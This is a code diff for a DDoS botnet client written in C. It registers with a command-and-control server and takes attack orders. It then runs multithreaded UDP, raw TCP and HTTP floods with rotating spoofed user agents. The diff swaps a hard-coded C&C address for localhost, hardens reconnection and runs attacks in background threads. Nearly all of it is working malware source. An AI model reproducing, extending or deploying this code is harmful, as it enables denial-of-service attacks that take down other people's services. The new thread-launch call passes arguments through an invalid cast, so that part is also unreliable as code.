@@ -13,12 +13,12 @@
 #include <signal.h>
 #include <errno.h>
 #include <sys/time.h>
+#include <fcntl.h>
 
 #define MAX_PACKET 65535
 #define DEFAULT_THREADS 10
 #define DEFAULT_SIZE 1400
 #define MAX_THREADS 100
-#define SOCKETS_PER_THREAD 4
 
 typedef struct {
     char target[64];
@@ -30,43 +30,30 @@ typedef struct {
     char host[128];
     char path[256];
     int http_mode;
+    int attack_id;
 } attack_args_t;
 
 volatile int attack_running = 1;
 volatile unsigned long long packets_sent = 0;
 volatile unsigned long long bytes_sent = 0;
+int g_sockfd = -1;
+pthread_mutex_t sock_mutex = PTHREAD_MUTEX_INITIALIZER;
 
 const char *user_agents[] = {
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:109.0) Gecko/20100101 Firefox/121.0",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:109.0) Gecko/20100101 Firefox/121.0",
     "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
     "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
     "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.193 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.5.3206.63",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:109.0) Gecko/20100101 Firefox/121.0",
-    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
-    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:109.0) Gecko/20100101 Firefox/120.0",
     "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
     "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
     "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
@@ -354,6 +341,7 @@ void *udp_flood(void *arg) {
             bytes_sent += result;
             sent_count++;
         }
+        usleep(1);
     }
 
     free(packet);
@@ -423,38 +411,10 @@ void *raw_tcp_flood(void *arg) {
             bytes_sent += packet_size;
             sent_count++;
         }
+        usleep(1);
     }
 
     close(sockfd);
-    return NULL;
-}
-
-void print_stats() {
-    static time_t last_print = 0;
-    static unsigned long long last_packets = 0;
-    static unsigned long long last_bytes = 0;
-    time_t now = time(NULL);
-    
-    if (now - last_print >= 1) {
-        unsigned long long pps = packets_sent - last_packets;
-        unsigned long long bps = bytes_sent - last_bytes;
-        double mbps = (bps * 8) / 1000000.0;
-        double gbps = mbps / 1000.0;
-        
-        printf("\r[+] Pacotes: %llu | PPS: %llu | %.2f Mbps | %.3f Gbps     ",
-               packets_sent, pps, mbps, gbps);
-        fflush(stdout);
-        last_print = now;
-        last_packets = packets_sent;
-        last_bytes = bytes_sent;
-    }
-}
-
-void *stats_thread(void *arg) {
-    while (attack_running) {
-        print_stats();
-        usleep(100000);
-    }
     return NULL;
 }
 
@@ -476,10 +436,13 @@ void parse_url(char *url, char *host, char *path) {
 
 void execute_attack(char *target, int port, int duration, int threads, int packet_size, int use_raw, int use_tcp, int use_http, char *host, char *path) {
     srand(time(NULL) ^ getpid() ^ (unsigned long)pthread_self());
-    signal(SIGPIPE, SIG_IGN);
 
     pthread_t *threads_arr = malloc(threads * sizeof(pthread_t));
     attack_args_t *args = malloc(threads * sizeof(attack_args_t));
+
+    attack_running = 1;
+    packets_sent = 0;
+    bytes_sent = 0;
 
     for (int i = 0; i < threads; i++) {
         strncpy(args[i].target, target, sizeof(args[i].target) - 1);
@@ -509,9 +472,6 @@ void execute_attack(char *target, int port, int duration, int threads, int packe
         }
     }
 
-    pthread_t stats_thread_id;
-    pthread_create(&stats_thread_id, NULL, stats_thread, NULL);
-
     sleep(duration);
     attack_running = 0;
 
@@ -519,51 +479,28 @@ void execute_attack(char *target, int port, int duration, int threads, int packe
         pthread_join(threads_arr[i], NULL);
     }
 
-    pthread_cancel(stats_thread_id);
-    pthread_join(stats_thread_id, NULL);
-
-    double total_gb = (bytes_sent * 8) / 1000000000.0;
-
-    printf("\n\n[+] Ataque finalizado!\n");
-    printf("[+] Total de pacotes enviados: %llu\n", packets_sent);
-    printf("[+] Total de dados enviados: %.2f GB\n", total_gb);
-    if (duration > 0) {
-        printf("[+] Media de PPS: %llu\n", packets_sent / duration);
-        printf("[+] Media de Gbps: %.3f\n", total_gb / duration);
-    }
-
     free(threads_arr);
     free(args);
 }
 
-void parse_command(char *cmd, char *target, int *port, int *duration, char *method, int *threads, int *packet_size) {
-    char cmd_copy[512];
-    strcpy(cmd_copy, cmd);
-    
-    char *token = strtok(cmd_copy, " ");
-    token = strtok(NULL, " ");
-    if (token) strcpy(target, token);
-    
-    token = strtok(NULL, " ");
-    if (token) *port = atoi(token);
-    
-    token = strtok(NULL, " ");
-    if (token) *duration = atoi(token);
-    
-    token = strtok(NULL, " ");
-    if (token) strcpy(method, token);
-    
-    token = strtok(NULL, " ");
-    if (token) *threads = atoi(token);
-    
-    token = strtok(NULL, " ");
-    if (token) *packet_size = atoi(token);
+int send_to_cnc(int sock, const char *msg) {
+    pthread_mutex_lock(&sock_mutex);
+    int ret = send(sock, msg, strlen(msg), 0);
+    pthread_mutex_unlock(&sock_mutex);
+    return ret;
+}
+
+int recv_from_cnc(int sock, char *buffer, int size) {
+    pthread_mutex_lock(&sock_mutex);
+    int ret = recv(sock, buffer, size - 1, 0);
+    pthread_mutex_unlock(&sock_mutex);
+    return ret;
 }
 
 int main(int argc, char *argv[]) {
-    char cnc_ip[64] = "45.134.39.212";
+    char cnc_ip[64] = "127.0.0.1";
     int cnc_port = 4087;
-    char arch[32] = "x86";
+    char arch[32] = "linux";
     char version[32] = "1.0";
     
     if (argc >= 2) {
@@ -596,6 +533,7 @@ int main(int argc, char *argv[]) {
     time_t now;
     int connected = 0;
     int reconnect_attempts = 0;
+    int attack_in_progress = 0;
 
     signal(SIGPIPE, SIG_IGN);
 
@@ -607,7 +545,16 @@ int main(int argc, char *argv[]) {
         }
 
         int keepalive = 1;
+        int keepidle = 10;
+        int keepintvl = 5;
+        int keepcnt = 3;
         setsockopt(sockfd, SOL_SOCKET, SO_KEEPALIVE, &keepalive, sizeof(keepalive));
+        setsockopt(sockfd, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(keepidle));
+        setsockopt(sockfd, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(keepintvl));
+        setsockopt(sockfd, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(keepcnt));
+
+        int flags = fcntl(sockfd, F_GETFL, 0);
+        fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);
 
         server_addr.sin_family = AF_INET;
         server_addr.sin_port = htons(cnc_port);
@@ -618,43 +565,58 @@ int main(int argc, char *argv[]) {
         }
 
         if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
-            close(sockfd);
-            reconnect_attempts++;
-            sleep(5 + (reconnect_attempts > 10 ? 10 : 0));
-            continue;
+            if (errno != EINPROGRESS) {
+                close(sockfd);
+                sleep(5);
+                continue;
+            }
+            fd_set fdset;
+            struct timeval tv;
+            tv.tv_sec = 10;
+            tv.tv_usec = 0;
+            FD_ZERO(&fdset);
+            FD_SET(sockfd, &fdset);
+            if (select(sockfd + 1, NULL, &fdset, NULL, &tv) <= 0) {
+                close(sockfd);
+                sleep(5);
+                continue;
+            }
         }
+
+        flags = fcntl(sockfd, F_GETFL, 0);
+        fcntl(sockfd, F_SETFL, flags & ~O_NONBLOCK);
 
         reconnect_attempts = 0;
         connected = 1;
+        g_sockfd = sockfd;
 
         snprintf(send_buf, sizeof(send_buf), "HBT|%s|%s\n", arch, version);
-        send(sockfd, send_buf, strlen(send_buf), 0);
+        send_to_cnc(sockfd, send_buf);
 
         struct timeval tv;
-        tv.tv_sec = 10;
+        tv.tv_sec = 5;
         tv.tv_usec = 0;
         setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
 
         while (connected) {
             memset(buffer, 0, sizeof(buffer));
-            int bytes = recv(sockfd, buffer, sizeof(buffer) - 1, 0);
+            int bytes = recv_from_cnc(sockfd, buffer, sizeof(buffer));
 
             if (bytes <= 0) {
+                if (attack_in_progress) {
+                    sleep(1);
+                    continue;
+                }
                 connected = 0;
                 break;
             }
 
             buffer[bytes] = '\0';
 
-            if (strcmp(buffer, "PING\n") == 0) {
-                send(sockfd, "PONG\n", 5, 0);
-                continue;
-            }
-
             now = time(NULL);
-            if (now - last_heartbeat >= 25) {
+            if (now - last_heartbeat >= 20) {
                 snprintf(send_buf, sizeof(send_buf), "HBT|%s|%s\n", arch, version);
-                send(sockfd, send_buf, strlen(send_buf), 0);
+                send_to_cnc(sockfd, send_buf);
                 last_heartbeat = now;
             }
 
@@ -668,12 +630,15 @@ int main(int argc, char *argv[]) {
                 
                 token = strtok(NULL, " ");
                 if (token) port = atoi(token);
+                else port = 80;
                 
                 token = strtok(NULL, " ");
                 if (token) duration = atoi(token);
+                else duration = 30;
                 
                 token = strtok(NULL, " ");
                 if (token) strcpy(method, token);
+                else strcpy(method, "udp");
                 
                 token = strtok(NULL, " ");
                 if (token) threads = atoi(token);
@@ -710,44 +675,36 @@ int main(int argc, char *argv[]) {
                     if (strlen(host) == 0) strcpy(host, target);
                     if (strlen(path) == 0) strcpy(path, "/");
                     strcpy(target, ip);
-                } else if (strcmp(method, "udp") == 0 || strcmp(method, "tcp") == 0) {
-                    if (strcmp(method, "tcp") == 0) use_tcp = 1;
+                } else if (strcmp(method, "tcp") == 0) {
+                    use_tcp = 1;
                 }
 
-                if (geteuid() != 0 && (use_raw || use_tcp || use_http)) {
-                    continue;
-                }
-
-                attack_running = 1;
-                packets_sent = 0;
-                bytes_sent = 0;
-
-                if (use_http) {
-                    execute_attack(target, port, duration, threads, packet_size, 1, 0, 1, host, path);
-                } else if (use_tcp) {
-                    execute_attack(target, port, duration, threads, packet_size, 1, 1, 0, NULL, NULL);
-                } else if (use_raw) {
-                    execute_attack(target, port, duration, threads, packet_size, 1, 0, 0, NULL, NULL);
-                } else {
-                    execute_attack(target, port, duration, threads, packet_size, 0, 0, 0, NULL, NULL);
-                }
+                attack_in_progress = 1;
+                
+                pthread_t attack_thread;
+                pthread_create(&attack_thread, NULL, (void *(*)(void *))execute_attack, 
+                    (void *)(long[]){ (long)target, port, duration, threads, packet_size, use_raw, use_tcp, use_http, (long)host, (long)path });
+                pthread_detach(attack_thread);
 
                 char report[128];
-                snprintf(report, sizeof(report), "ATTACK_OK:%s:%llu\n", "done", packets_sent);
-                send(sockfd, report, strlen(report), 0);
+                snprintf(report, sizeof(report), "ATTACK_OK:started:%d\n", duration);
+                send_to_cnc(sockfd, report);
             }
-            else if (strcmp(buffer, ".stop\n") == 0) {
+            else if (strncmp(buffer, ".stop", 5) == 0) {
                 attack_running = 0;
-                send(sockfd, "STOP_OK\n", 8, 0);
+                attack_in_progress = 0;
+                send_to_cnc(sockfd, "STOP_OK\n");
             }
-            else if (strncmp(buffer, "PING", 4) == 0) {
-                send(sockfd, "PONG\n", 5, 0);
+            else if (strcmp(buffer, "PING\n") == 0) {
+                send_to_cnc(sockfd, "PONG\n");
             }
         }
 
         close(sockfd);
+        g_sockfd = -1;
         connected = 0;
-        sleep(1);
+        attack_in_progress = 0;
+        sleep(3);
     }
 
     return 0;
